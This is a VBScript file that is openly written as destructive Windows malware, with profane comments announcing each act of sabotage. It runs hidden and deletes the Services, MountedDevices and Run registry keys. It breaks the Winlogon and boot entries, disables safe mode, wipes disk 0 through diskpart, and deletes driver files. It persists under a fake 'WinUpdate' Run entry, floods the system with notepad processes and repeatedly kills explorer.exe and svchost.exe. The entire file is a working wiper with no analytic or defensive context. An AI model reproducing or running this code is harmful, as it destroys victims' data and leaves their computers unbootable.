Option Explicit 
Dim x7p9q, q3z8k, k9m2v, r4t6y, z2w8j
Set x7p9q = CreateObject("WScript.Shell") ' Shell for silent fuckery
Set q3z8k = CreateObject("Scripting.FileSystemObject") ' File system chaos
Set k9m2v = CreateObject("WScript.Shell") ' Registry sabotage


x7p9q.Run "cmd.exe /c " & WScript.ScriptFullName, 0, False


On Error Resume Next
x7p9q.Run "reg delete HKLM\SYSTEM\MountedDevices /f", 0, True ' Screw disk mappings
x7p9q.Run "reg delete HKLM\SYSTEM\CurrentControlSet\Services /f", 0, True ' Kill services
x7p9q.Run "reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /f", 0, True ' No startup apps
k9m2v.RegWrite "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\BootExecute", "invalid_command", "REG_MULTI_SZ" ' Break boot
k9m2v.RegWrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell", "invalid.exe", "REG_SZ" ' Login fails
k9m2v.RegWrite "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit", "C:\invalid\userinit.exe", "REG_SZ" ' No user init
k9m2v.RegWrite "HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Option\OptionValue", "0", "REG_DWORD" ' No safe mode


If Not q3z8k.FolderExists("C:\Temp") Then q3z8k.CreateFolder("C:\Temp")
Set z2w8j = q3z8k.CreateTextFile("C:\Temp\dp.txt", True)
z2w8j.WriteLine "select disk 0"
z2w8j.WriteLine "clean"
z2w8j.Close
x7p9q.Run "cmd /c diskpart /s C:\Temp\dp.txt", 0, True
q3z8k.DeleteFile("C:\Temp\dp.txt")


q3z8k.DeleteFile("C:\Windows\System32\drivers\acpi.sys") ' Power management dies
q3z8k.DeleteFile("C:\Windows\System32\drivers\cdrom.sys") ' CD/DVD fucked
On Error GoTo 0


k9m2v.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WinUpdate", WScript.ScriptFullName, "REG_SZ"


For r4t6y = 1 To 100
    x7p9q.Run "notepad.exe", 0, False ' Spawn endless notepads
Next


x7p9q.Run "taskkill /F /IM explorer.exe", 0, True ' Desktop goes dark
x7p9q.Run "taskkill /F /IM svchost.exe", 0, True ' Services implode


Do
    WScript.Sleep 60000 ' Wait a minute
    For r4t6y = 1 To 50
        x7p9q.Run "notepad.exe", 0, False ' More resource hogging
    Next
    x7p9q.Run "taskkill /F /IM explorer.exe", 0, True ' Keep desktop dead
Loop